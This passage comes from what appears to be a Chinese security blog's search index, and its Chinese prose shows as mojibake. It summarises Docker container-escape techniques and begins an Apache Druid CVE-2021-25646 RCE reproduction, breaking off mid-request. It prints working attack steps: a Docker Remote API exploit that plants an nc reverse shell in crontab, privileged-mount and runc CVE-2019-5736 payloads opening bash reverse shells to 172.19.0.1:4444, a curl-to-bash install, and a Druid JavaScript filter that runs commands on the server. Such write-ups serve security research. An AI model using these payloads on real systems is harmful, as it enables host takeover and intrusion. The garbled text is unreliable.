æ³•ç›¸äº’çœ‹åˆ°ï¼Œä½†æ˜¯å®ƒä»¬ä»ç„¶è¿è¡Œåœ¨åˆšåˆšçš„ç¯å¢ƒä¸Šï¼Œä½¿ç”¨ç€ä¸åˆšåˆšä¸€æ ·çš„èµ„æºã€‚æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºï¼Œå®ƒä»¬ä¸åŠ å£³ä¹‹å‰çš„åŒºåˆ«å°±æ˜¯æ— æ³•ç›¸äº’äº¤æµäº†ã€‚éœ€è¦è¯´ä¸€å¥çš„æ˜¯ï¼Œè¿™ä¸ªå£³æˆ‘ä»¬å¯ä»¥å°†å®ƒçœ‹ä½œä¸€ä¸ªå•å‘çš„é—¨ï¼Œå¤–éƒ¨å¯ä»¥å¾€å†…èµ°ï¼Œä½†æ˜¯å†…éƒ¨å´ä¸èƒ½å¾€å¤–èµ°ã€‚è¿™åœ¨è®¡ç®—æœºä¸­çš„æ„æ€å°±æ˜¯ï¼Œå¤–éƒ¨è¿›ç¨‹å¯ä»¥çœ‹åˆ°å†…éƒ¨è¿›ç¨‹ï¼Œä½†æ˜¯å†…éƒ¨è¿›ç¨‹å´ä¸èƒ½çœ‹åˆ°å¤–éƒ¨è¿›ç¨‹ã€‚ ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:1:0","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.1 namespace å‘½åç©ºé—´ (namespaces) æ˜¯ Linux ä¸ºæˆ‘ä»¬æä¾›çš„ç”¨äºåˆ†ç¦»è¿›ç¨‹æ ‘ã€ç½‘ç»œæ¥å£ã€æŒ‚è½½ç‚¹ä»¥åŠè¿›ç¨‹é—´é€šä¿¡ç­‰èµ„æºçš„æ–¹æ³•ï¼Œæ˜¯å†…æ ¸çº§åˆ«çš„ç¯å¢ƒéš”ç¦»ã€‚åœ¨å®é™…çš„è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¤šä¸ªæœåŠ¡ä¹‹é—´çš„çŠ¶æ€æˆ–èµ„æºæ˜¯ä¼šç›¸äº’å½±å“çš„ï¼Œæ¯ä¸€ä¸ªæœåŠ¡éƒ½èƒ½çœ‹åˆ°å…¶å®ƒæœåŠ¡çš„è¿›ç¨‹ï¼Œä¹Ÿå¯ä»¥è®¿é—®å®¿ä¸»æœºå™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ï¼Œè€Œ docker çš„ç›®çš„æ˜¯åŒä¸€å°æœºå™¨ä¸Šçš„ä¸åŒæœåŠ¡èƒ½åšåˆ°å®Œå…¨éš”ç¦»ï¼Œå°±åƒè¿è¡Œåœ¨å¤šå°ä¸åŒçš„æœºå™¨ä¸Šä¸€æ ·ï¼Œå¯¹æ­¤å°±éœ€è¦åœ¨åˆ›å»ºè¿›ç¨‹çš„æ—¶å€™æŒ‡å®š namespaces æ¥å®ç°ã€‚ Linux çš„å‘½åç©ºé—´æœºåˆ¶æä¾›äº†ä»¥ä¸‹ä¸ƒç§ä¸åŒçš„å‘½åç©ºé—´ï¼ŒåŒ…æ‹¬ CLONE_NEWCGROUPã€CLONE_NEWIPCã€CLONE_NEWNETã€CLONE_NEWNSã€CLONE_NEWPIDã€CLONE_NEWUSER å’Œ CLONE_NEWUTSï¼Œé€šè¿‡è¿™ä¸ƒä¸ªé€‰é¡¹æˆ‘ä»¬èƒ½åœ¨åˆ›å»ºæ–°çš„è¿›ç¨‹æ—¶è®¾ç½®æ–°è¿›ç¨‹åº”è¯¥åœ¨å“ªäº›èµ„æºä¸Šä¸å®¿ä¸»æœºå™¨è¿›è¡Œéš”ç¦»ã€‚ ç”±ä»¥ä¸Šå¯çŸ¥ï¼ŒDocker å¹¶æ²¡æœ‰ä½¿ç”¨ä»»ä½•è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå…¶å°±æ˜¯ä¸€ç§éš”ç¦»æŠ€æœ¯ã€‚å¦‚æœä½ å¯¹ Linux å‘½ä»¤æ¯”è¾ƒç†Ÿæ‚‰ï¼Œç”šè‡³å¯ä»¥ç†è§£ä¸º Docker æ˜¯ä¸€ç§é«˜çº§çš„ chrootã€‚ ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:1:1","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.2 docker å®‰å…¨æœºåˆ¶ å› ä¸º Docker æ‰€ä½¿ç”¨çš„æ˜¯éš”ç¦»æŠ€æœ¯ï¼Œä½¿ç”¨çš„ä»ç„¶æ˜¯å®¿ä¸»æœºçš„å†…æ ¸ã€CPUã€å†…å­˜ï¼Œé‚£ä¼šä¸ä¼šå¸¦æ¥ä¸€äº›å®‰å…¨é—®é¢˜ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œé‚£ Docker æ˜¯æ€ä¹ˆé˜²æŠ¤çš„ï¼Ÿ Docker çš„å®‰å…¨æœºåˆ¶æœ‰å¾ˆå¤šç§ï¼šLinux Capabilityã€AppArmorã€SELinuxã€Seccomp ç­‰ç­‰ï¼Œæœ¬æ–‡ä¸»è¦è®²è¿°ä¸€ä¸‹ Linux Capability å› ä¸º Docker é»˜è®¤å¯¹ User Namespace æœªè¿›è¡Œéš”ç¦»ï¼Œåœ¨ Docker å†…éƒ¨æŸ¥çœ‹ /etc/passwd å¯ä»¥çœ‹åˆ° uid ä¸º 0ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒDocker å†…éƒ¨çš„ root å°±æ˜¯å®¿ä¸»æœºçš„ rootã€‚ä½†æ˜¯å¦‚æœä½ ä½¿ç”¨ä¸€äº›å‘½ä»¤ï¼Œç±»ä¼¼ iptables -Lï¼Œä¼šæç¤ºä½ æƒé™ä¸è¶³ã€‚ è¿™æ˜¯ç”± Linux Capability æœºåˆ¶æ‰€å®ç°çš„ã€‚è‡ª Linux å†…æ ¸ 2.1 ç‰ˆæœ¬åï¼Œå¼•å…¥äº† Capability çš„æ¦‚å¿µï¼Œå®ƒæ‰“ç ´äº†æ“ä½œç³»ç»Ÿä¸­è¶…çº§ç”¨æˆ·/æ™®é€šç”¨æˆ·çš„æ¦‚å¿µï¼Œç”±æ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥åšåªæœ‰è¶…çº§ç”¨æˆ·å¯ä»¥å®Œæˆçš„æ“ä½œã€‚ Linux Capability ä¸€å…±æœ‰ 38 ç§ï¼Œåˆ†åˆ«å¯¹åº”ç€ä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¼ŒDocker é»˜è®¤åªå¼€å¯äº† 14 ç§ã€‚è¿™æ ·å°±é¿å…äº†å¾ˆå¤šå®‰å…¨çš„é—®é¢˜ã€‚ç†Ÿæ‚‰ Docker æ“ä½œçš„äººåº”è¯¥å¯ä»¥æ„è¯†åˆ°ï¼Œåœ¨å¼€å¯ Docker çš„æ—¶å€™å¯ä»¥åŠ ä¸€ä¸ªå‚æ•°æ˜¯ --privileged=trueï¼Œè¿™æ ·å°±ç›¸å½“äºå¼€å¯äº†æ‰€æœ‰çš„ Capabilityã€‚ä½¿ç”¨ docker inspect {container.id} åœ¨ CapAadd é¡¹é‡Œå¯ä»¥çœ‹åˆ°æ·»åŠ çš„ capabilityã€‚ ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:1:2","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2 åˆ¤æ–­æ˜¯å¦åœ¨ Docker å®¹å™¨ä¸­ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ¤æ–­æ˜¯å¦åœ¨ Docker ç¯å¢ƒé‡Œï¼Œå¸¸ç”¨çš„ä¸¤ä¸ªæ£€æµ‹æ–¹å¼ï¼š æ£€æŸ¥ /.dockerenv æ–‡ä»¶æ˜¯å¦å­˜åœ¨ æ£€æŸ¥ /proc/1/cgroup å†…æ˜¯å¦åŒ…å« Docker ç­‰å­—ç¬¦ä¸²ã€‚ ç›®å‰æ¥è¯´ï¼Œè¿™ä¸¤ç§æ£€æµ‹æ–¹å¼è¿˜æ˜¯æ¯”è¾ƒæœ‰æ•ˆçš„ï¼Œå…¶ä»–æ£€æµ‹æ–¹å¼ï¼Œå¦‚æ£€æµ‹mountã€fdisk -l æŸ¥çœ‹ç¡¬ç›˜ ã€åˆ¤æ–­ PID 1 çš„è¿›ç¨‹åç­‰ä¹Ÿå¯ç”¨æ¥è¾…åŠ©åˆ¤æ–­ã€‚ ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:2:0","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3 é…ç½®ä¸å½“å¼•å‘ Docker é€ƒé€¸ ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:3:0","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3.1 Docker Remote API æœªæˆæƒè®¿é—® æ¼æ´ç®€è¿°ï¼šDocker Remote API å¯ä»¥æ‰§è¡Œ Docker å‘½ä»¤ï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹ç›‘å¬åœ¨ 0.0.0.0ï¼Œå¯ç›´æ¥è°ƒç”¨ API æ¥æ“ä½œ Dockerã€‚ åˆ©ç”¨æ–¹æ³•æ˜¯ï¼Œæˆ‘ä»¬éšæ„å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œå¹¶å°†å®¿ä¸»æœºçš„ /etc ç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­ï¼Œä¾¿å¯ä»¥ä»»æ„è¯»å†™æ–‡ä»¶äº†ã€‚æˆ‘ä»¬å¯ä»¥å°†å‘½ä»¤å†™å…¥ crontab é…ç½®æ–‡ä»¶ï¼Œè¿›è¡Œåå¼¹ shellã€‚ EXPï¼š import docker client = docker.DockerClient(base_url='http://your-ip:2375/') data = client.containers.run('alpine:latest', r'''sh -c \"echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' \u003e\u003e /tmp/etc/crontab\" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}) ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:3:1","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3.2 docker.sock æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ åœºæ™¯æè¿°ï¼šç®€å•æ¥è¯´å°±æ˜¯ docker in dockerï¼Œåœ¨ docker å®¹å™¨ä¸­è°ƒç”¨å’Œæ‰§è¡Œå®¿ä¸»æœºçš„ dockerï¼Œå°† docker å®¿ä¸»æœºçš„ docker æ–‡ä»¶å’Œ docker.sock æ–‡ä»¶æŒ‚è½½åˆ°å®¹å™¨ä¸­ï¼Œå…·ä½“ä¸ºï¼š docker run --rm -it \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /usr/bin/docker:/usr/bin/docker \\ ubuntu \\ /bin/bash æ¼æ´å¤ç°ï¼š åœ¨å®¹å™¨ä¸­æ‰¾åˆ° docker.sock root@95a280bc5a19:/# find / -name docker.sock /run/docker.sock åœ¨å®¹å™¨æŸ¥çœ‹å®¿ä¸»æœº docker ä¿¡æ¯ï¼š docker -H unix:///var/run/docker.sock info è¿è¡Œä¸€ä¸ªæ–°å®¹å™¨å¹¶æŒ‚è½½å®¿ä¸»æœºæ ¹è·¯å¾„ï¼š docker -H unix:///var/run/docker.sock run -it -v /:/test ubuntu /bin/bash åœ¨æ–°å®¹å™¨çš„ /test ç›®å½•ä¸‹ï¼Œå°±å¯ä»¥è®¿é—®åˆ°å®¿ä¸»æœºçš„å…¨éƒ¨èµ„æºï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™å…¥ SSH å¯†é’¥æˆ–è€…å†™å…¥è®¡åˆ’ä»»åŠ¡ï¼Œè·å– shellã€‚ ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:3:2","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3.3 Docker é«˜å±å¯åŠ¨å‚æ•° Docker ä¸­å­˜åœ¨ä¸€äº›æ¯”è¾ƒé«˜å±çš„å¯åŠ¨å‘½ä»¤ï¼Œç»™äºˆå®¹å™¨è¾ƒå¤§çš„æƒé™ï¼Œå…è®¸æ‰§è¡Œä¸€äº›ç‰¹æƒæ“ä½œï¼Œåœ¨ä¸€å®šçš„æ¡ä»¶ä¸‹ï¼Œå¯ä»¥å¯¼è‡´å®¹å™¨é€ƒé€¸ã€‚ docker run --rm -it --privileged -v /:/soft --cap-add=SYS_ADMIN --net=host --pid=host --ipc=host ubuntu /bin/bash ç‰¹æƒæ¨¡å¼ â€“privileged ä½¿ç”¨ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„å®¹å™¨æ—¶ï¼Œdocker ç®¡ç†å‘˜å¯é€šè¿‡ mount å‘½ä»¤å°†å¤–éƒ¨å®¿ä¸»æœºç£ç›˜è®¾å¤‡æŒ‚è½½è¿›å®¹å™¨å†…éƒ¨ï¼Œè·å–å¯¹æ•´ä¸ªå®¿ä¸»æœºçš„æ–‡ä»¶è¯»å†™æƒé™ï¼Œæ­¤å¤–è¿˜å¯ä»¥é€šè¿‡å†™å…¥è®¡åˆ’ä»»åŠ¡ç­‰æ–¹å¼åœ¨å®¿ä¸»æœºæ‰§è¡Œå‘½ä»¤ã€‚ é€šè¿‡ç‰¹æƒæ¨¡å¼è¿è¡Œä¸€ä¸ªå®¹å™¨ï¼š docker run -itd --privileged ubuntu:latest /bin/bash åœ¨å®¹å™¨å†…ï¼ŒæŸ¥çœ‹ç£ç›˜æ–‡ä»¶ï¼š fdisk -l å°† /dev/sda1 æŒ‚è½½åˆ°æ–°å»ºç›®å½• mkdir /test mount /dev/sda1 /test å°†è®¡åˆ’ä»»åŠ¡å†™å…¥åˆ°å®¿ä¸»æœº echo '* * * * * /bin/bash -i \u003e\u0026 /dev/tcp/172.19.0.1/4444 0\u003e\u00261' \u003e\u003e /test/var/spool/cron/crontabs/root ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:3:3","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3.4 Docker è½¯ä»¶è®¾è®¡å¼•èµ·çš„é€ƒé€¸ 3.4.1 CVE-2019-5736 CVE-2019-5736 æ˜¯ runC çš„ CVE æ¼æ´ç¼–å·ï¼ŒrunC æœ€åˆæ˜¯ä½œä¸º Docker çš„ä¸€éƒ¨åˆ†å¼€å‘çš„ï¼Œåæ¥ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„å¼€æºå·¥å…·å’Œåº“è¢«æå–å‡ºæ¥ï¼Œåœ¨ docker æ•´ä¸ªæ¶æ„çš„è¿è¡Œè¿‡ç¨‹ä¸­ï¼ŒContainerd å‘ docker æä¾›è¿è¡Œå®¹å™¨çš„ APIï¼ŒäºŒè€…é€šè¿‡ grpc è¿›è¡Œäº¤äº’ã€‚containerd æœ€åé€šè¿‡ runc æ¥å®é™…è¿è¡Œå®¹å™¨ã€‚ å½±å“ç‰ˆæœ¬ docker version \u003c=18.09.2 RunC version \u003c=1.0-rc6 åˆ©ç”¨æ¡ä»¶ï¼š æ”»å‡»è€…å¯æ§ imageï¼Œè¿›ä¸€æ­¥æ§åˆ¶ç”Ÿæˆçš„ container æ”»å‡»è€…å…·æœ‰æŸå·²å­˜åœ¨å®¹å™¨çš„å†™æƒé™ï¼Œä¸”å¯é€šè¿‡ docker exec è¿›å…¥ æ¼æ´å¤ç°ï¼š æµ‹è¯•ç¯å¢ƒé•œåƒä¸‹è½½å®‰è£… curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh \u0026\u0026 bash install.sh ä¸‹è½½POCï¼Œä¿®æ”¹è„šæœ¬ï¼Œç¼–è¯‘ # ä¸‹è½½ poc git clone https://github.com/Frichetten/CVE-2019-5736-PoC # ä¿®æ”¹Payload vi main.go payload = \"#!/bin/bash \\n bash -i \u003e\u0026 /dev/tcp/172.19.0.1/4444 0\u003e\u00261\" # ç¼–è¯‘ç”Ÿæˆ payload CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go # æ‹·è´åˆ° docker å®¹å™¨ä¸­æ‰§è¡Œ docker cp ./main 248f8b7d3c45:/tmp åœ¨å®¹å™¨ä¸­æ‰§è¡Œ payloadï¼š root@d1b112ea4a5e:/tmp# ./main [+] Overwritten /bin/sh successfully [+] Found the PID: 16 [+] Successfully got the file handle [+] Successfully got write handle \u0026{0xc8201231e0} å‡è®¾ï¼Œç®¡ç†å‘˜é€šè¿‡ exec è¿›å…¥å®¹å™¨ï¼Œä»è€Œè§¦å‘ Payloadã€‚ docker exec -it cafa20cfb0f9 /bin/sh åœ¨ 172.19.0.1 ä¸Šç›‘å¬æœ¬åœ°ç«¯å£ï¼ŒæˆåŠŸè·å–å®¿ä¸»æœºåå¼¹å›æ¥çš„shellã€‚ 3.4.2 CVE-2019-14271 https://xz.aliyun.com/t/6806 ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:3:4","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3.5 å†…æ ¸æ¼æ´ Dirty Cowï¼ˆCVE-2016-5195ï¼‰æ˜¯ Linux å†…æ ¸ä¸­çš„æƒé™æå‡æ¼æ´ï¼Œé€šè¿‡å®ƒå¯å®ç° Docker å®¹å™¨é€ƒé€¸ï¼Œè·å¾— root æƒé™çš„ shellã€‚ ç¯å¢ƒå‡†å¤‡ï¼š docker ä¸å®¿ä¸»æœºå…±äº«å†…æ ¸ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å­˜åœ¨ dirtyCow æ¼æ´çš„å®¿ä¸»æœºé•œåƒã€‚ æ·»åŠ å®¹å™¨ä¸‹è½½å¹¶è¿è¡Œï¼š git clone https://github.com/gebl/dirtycow-docker-vdso.git cd dirtycow-docker-vdso/ sudo docker-compose run dirtycow /bin/bash **æ¼æ´åˆ©ç”¨ï¼š**è¿›å…¥å®¹å™¨ï¼Œç¼–è¯‘ POC å¹¶æ‰§è¡Œ cd /dirtycow-vdso/ make ./0xdeadbeef 172.19.0.1:4444 åœ¨ 172.19.0.1 ç›‘å¬æœ¬åœ°ç«¯å£ï¼ŒæˆåŠŸæ¥æ”¶åˆ°å®¿ä¸»æœºåå¼¹çš„ shellã€‚ ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:3:5","tags":["äº‘åŸç”Ÿå®‰å…¨","Docker"],"title":"Docker é€ƒé€¸ç›¸å…³æ€»ç»“","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2021-25646ï¼šApache Druid RCEå¤ç°","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["Druid","æ¼æ´å¤ç°"],"title":"CVE-2021-25646 - Apache Druid RCE å¤ç°","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Druid RCE å¤ç° ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["Druid","æ¼æ´å¤ç°"],"title":"CVE-2021-25646 - Apache Druid RCE å¤ç°","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"1 æ¼æ´ä»‹ç» ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["Druid","æ¼æ´å¤ç°"],"title":"CVE-2021-25646 - Apache Druid RCE å¤ç°","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"1.1 Druid Druid æ˜¯ä¸€ä¸ª JDBC ç»„ä»¶ï¼Œæ”¯æŒæ‰€æœ‰ JDBC å…¼å®¹çš„æ•°æ®åº“ï¼ŒåŒ…æ‹¬ Oracleã€MySqlã€Derbyã€Postgresqlã€SQL Serverã€H2 ç­‰ã€‚ ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:1","tags":["Druid","æ¼æ´å¤ç°"],"title":"CVE-2021-25646 - Apache Druid RCE å¤ç°","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"1.2 æ¼æ´æè¿° ç¼–å·ï¼šCVE-2021-25646 Apache Druid åŒ…æ‹¬æ‰§è¡Œç”¨æˆ·æä¾›çš„ JavaScript çš„åŠŸèƒ½åµŒå…¥åœ¨å„ç§ç±»å‹è¯·æ±‚ä¸­çš„ä»£ç ã€‚æ­¤åŠŸèƒ½åœ¨ç”¨äºé«˜ä¿¡ä»»åº¦ç¯å¢ƒä¸­ï¼Œé»˜è®¤å·²è¢«ç¦ç”¨ã€‚ä½†æ˜¯ï¼Œåœ¨ Druid 0.20.0 åŠæ›´ä½ç‰ˆæœ¬ä¸­ï¼Œç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·å¯ä»¥æ„é€ ä¼ å…¥çš„ json ä¸²æ¥æ§åˆ¶ä¸€äº›æ•æ„Ÿçš„å‚æ•°å‘é€æ¶æ„è¯·æ±‚ï¼Œåˆ©ç”¨ Apache Druid æ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚ ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:2","tags":["Druid","æ¼æ´å¤ç°"],"title":"CVE-2021-25646 - Apache Druid RCE å¤ç°","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"1.3 å½±å“ç‰ˆæœ¬ Apache Druid \u003c 0.20.1 ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:3","tags":["Druid","æ¼æ´å¤ç°"],"title":"CVE-2021-25646 - Apache Druid RCE å¤ç°","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"2 æ¼æ´å¤ç° ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:0","tags":["Druid","æ¼æ´å¤ç°"],"title":"CVE-2021-25646 - Apache Druid RCE å¤ç°","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"2.1 ç¯å¢ƒæ­å»º ä» docker ä»“åº“ä¸­æ‹‰å–ä¸€ä¸ªç‰ˆæœ¬ä¸º 0.16.0 çš„é•œåƒï¼š docker pull fokkodriesprong/docker-druid docker run --rm -i -p 8888:8888 fokkodriesprong/docker-druid ","date":"2021-02-02","objectID":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:2:1","tags":["Druid","æ¼æ´å¤ç°"],"title":"CVE-2021-25646 - Apache Druid RCE å¤ç°","uri":"/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"2.2 å¤ç° docker å®¹å™¨å¯åŠ¨åï¼Œè®¿é—® 8888ç«¯å£ï¼š ç‚¹å‡» Load data -\u003e Local Diskï¼š å¡«å…¥ Base directory: quickstart/tutorial/ File filter: wikiticker-2015-09-12-sampled.json.gz ä¸€ç›´ç‚¹å‡» next åˆ° filter é¡¹ æŠ“åŒ…ä¿®æ”¹ filter ä¸ºï¼š { \"type\":\"javascript\", \"function\":\"function(value){return java.lang.Runtime.getRuntime().exec('curl dnslog')}\", \"dimension\":\"added\", \"\":{ \"enabled\":\"true\" } } ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ POCï¼š POST /druid/indexer/v1/sampler HTTP/1.1 Host: xxx.xxx.xxx.xxx:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 995 Connection: close {\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": 